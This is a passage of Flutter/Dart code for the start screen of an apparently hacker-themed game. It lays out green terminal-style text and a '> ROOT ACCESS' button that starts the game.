                      style: GoogleFonts.sourceCodePro(color: Colors.green.shade700, fontSize: 12)),
                    const SizedBox(height: 24),
                    GestureDetector(
                      onTap: _startGame,
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 36, vertical: 14),
                        decoration: BoxDecoration(
                          color: Colors.green.shade900.withOpacity(0.4),
                          border: Border.all(color: Colors.greenAccent),
                        ),
                        child: Text("> ROOT ACCESS", style: GoogleFonts.sourceCodePro(color: Colors.white, fontWeight: FontWeight.bold)),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
      ],
    );
  }
}
